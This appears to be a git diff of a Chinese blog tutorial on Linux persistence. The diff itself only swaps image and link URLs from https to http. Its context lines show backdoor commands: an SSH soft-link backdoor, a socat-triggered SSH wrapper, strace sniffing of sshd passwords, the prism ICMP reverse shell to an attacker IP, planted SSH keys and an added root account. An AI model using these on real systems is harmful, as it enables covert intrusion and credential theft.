@@ -21,7 +21,7 @@ tags: 权限维持
 
 `ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=4444;`
 
-![](https://cdn.laohuan.art/2021-05-04_14-48-07ssh%E8%BD%AF%E9%93%BE%E6%8E%A51.png)
+![](http://qn.laohuan.xin/2021-05-04_14-48-07ssh%E8%BD%AF%E9%93%BE%E6%8E%A51.png)
 
 可使用当前用户登录也可新建用户
 
@@ -29,7 +29,7 @@ tags: 权限维持
 
 密码随便输入即可登录
 
-![](https://cdn.laohuan.art/2021-05-04_14-51-33-ssh%E8%BD%AF%E9%93%BE%E6%8E%A53.png)
+![](http://qn.laohuan.xin/2021-05-04_14-51-33-ssh%E8%BD%AF%E9%93%BE%E6%8E%A53.png)
 
 ##### SSH Wrapper
 
@@ -43,17 +43,17 @@ chmod u+x sshd
 /etc/init.d/ssh restart
 ```
 
-![](https://cdn.laohuan.art/2021-05-08_16-29-15-wrappr-1.png)
+![](http://qn.laohuan.xin/2021-05-08_16-29-15-wrappr-1.png)
 
 无13377端口处于监听状态
 
-![](https://cdn.laohuan.art/2021-05-08_16-31-40-wrappr-2.png)
+![](http://qn.laohuan.xin/2021-05-08_16-31-40-wrappr-2.png)
 
 攻击机执行如下命令
 
 ​	`socat STDIO TCP4:192.168.19.139:22,sourceport=13377`
 
-![](https://cdn.laohuan.art/2021-05-08_16-32-24-wrappr-3.png)
+![](http://qn.laohuan.xin/2021-05-08_16-32-24-wrappr-3.png)
 
 想要修改端口，使用python
 
@@ -67,13 +67,13 @@ print repr(buffer)
 
 `ps -ef | grep sshd`  //父进程PID
 
-![](https://cdn.laohuan.art/2021-05-10_21-03-36-strace.png)
+![](http://qn.laohuan.xin/2021-05-10_21-03-36-strace.png)
 
 `strace -f -p 2387 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048`
 
 `grep "read(6" /tmp/.ssh.log | tail -n 10`
 
-![](https://cdn.laohuan.art/2021-05-10_21-00-27-strace2.png)
+![](http://qn.laohuan.xin/2021-05-10_21-00-27-strace2.png)
 
 ##### 端口复用
 
@@ -83,27 +83,27 @@ print repr(buffer)
 
 将**Run=no**改为**Run=yes**，再修改其需要复用的端口
 
-![](https://cdn.laohuan.art/2021-05-08_18-40-24-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)
+![](http://qn.laohuan.xin/2021-05-08_18-40-24-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)
 
 直接ssh 443端口
 
-![](https://cdn.laohuan.art/2021-05-08_18-43-40-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)
+![](http://qn.laohuan.xin/2021-05-08_18-43-40-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)
 
 在测试时发现443端口如果有服务监听时无法成功，可能是我环境问题。
 
 ##### vegile
 
-[传送门](https://github.com/Screetsec/Vegile.git)
+[传送门](http://github.com/Screetsec/Vegile.git)
 
 ```bash
-git clone https://github.com/Screetsec/Vegile.git
+git clone http://github.com/Screetsec/Vegile.git
 cd Vegile
 chmod +x Vegile
 ```
 
 帮助信息
 
-![](https://cdn.laohuan.art/2021-05-10_21-46-59-vegile-h.png)
+![](http://qn.laohuan.xin/2021-05-10_21-46-59-vegile-h.png)
 
 生成msf木马
 
@@ -114,16 +114,16 @@ chmod +x Vegile
 `chmod +x test.elf`
 `./Vegile --u test.elf`
 
-![](https://cdn.laohuan.art/2021-05-10_22-00-14-vegile-t.png)
+![](http://qn.laohuan.xin/2021-05-10_22-00-14-vegile-t.png)
 
 ##### ICMP后门
 
-[项目地址](https://github.com/andreafabrizi/prism)
+[项目地址](http://github.com/andreafabrizi/prism)
 
 安装
 
 ```bash
-git clone https://github.com/andreafabrizi/prism.git
+git clone http://github.com/andreafabrizi/prism.git
 apt-get install libc6-dev-amd64
 ```
 
@@ -131,7 +131,7 @@ apt-get install libc6-dev-amd64
 
 `nano prism.c`
 
-![](https://cdn.laohuan.art/2021-05-12_20-58-19-icmp-1.png)
+![](http://qn.laohuan.xin/2021-05-12_20-58-19-icmp-1.png)
 
 编译
 
@@ -145,13 +145,13 @@ Nc 监听
 
 `python sendPacket.py 192.168.19.139 test  192.168.19.146 6666`
 
-![](https://cdn.laohuan.art/2021-05-12_20-59-32-icmp-2.png)
+![](http://qn.laohuan.xin/2021-05-12_20-59-32-icmp-2.png)
 
 成功获取shell,python交互式shell
 
 `python -c "import pty;pty.spawn('/bin/bash')"`
 
-![](https://cdn.laohuan.art/2021-05-12_21-01-22-icmp-3.png)
+![](http://qn.laohuan.xin/2021-05-12_21-01-22-icmp-3.png)
 
 ##### SSH KEY
 
@@ -161,7 +161,7 @@ Nc 监听
 
 直接回车会在默认位置～/.ssh下生成密钥对，我这里生成test
 
-![](https://cdn.laohuan.art/2021-05-13_21-01-17-sshkey1.png)
+![](http://qn.laohuan.xin/2021-05-13_21-01-17-sshkey1.png)
 
 将公钥test.pub的内容放到目标的authorized_keys文件中
 
@@ -172,13 +172,13 @@ Nc 监听
 `chmod 600 ~/.ssh/authorized_keys`
 `chmod 700 ~/.ssh`
 
-![](https://cdn.laohuan.art/2021-05-13_21-01-56-sshkey2.png)
+![](http://qn.laohuan.xin/2021-05-13_21-01-56-sshkey2.png)
 
 连接目标，**-i** 指定私钥
 
 `ssh -i test root@192.168.19.139 `
 
-![](https://cdn.laohuan.art/2021-05-13_21-02-32-sshkey3.png)
+![](http://qn.laohuan.xin/2021-05-13_21-02-32-sshkey3.png)
 
 ##### 其他命令
 
@@ -188,7 +188,7 @@ Nc 监听
 
    `perl -le 'print crypt("123456","haha")' `//密码:123456 盐值:haha
 
-![](https://cdn.laohuan.art/2021-05-13_21-48-52-add_root1.png)
+![](http://qn.laohuan.xin/2021-05-13_21-48-52-add_root1.png)
 
 ​	写入passwd
 
@@ -226,7 +226,7 @@ Nc 监听
 
 #### 参考连接
 
-[https://xz.aliyun.com/t/7338](https://xz.aliyun.com/t/7338)
+[http://xz.aliyun.com/t/7338](http://xz.aliyun.com/t/7338)
 
-[https://www.cnblogs.com/-mo-/p/12337766.html](https://www.cnblogs.com/-mo-/p/12337766.html)
+[http://www.cnblogs.com/-mo-/p/12337766.html](http://www.cnblogs.com/-mo-/p/12337766.html)
 
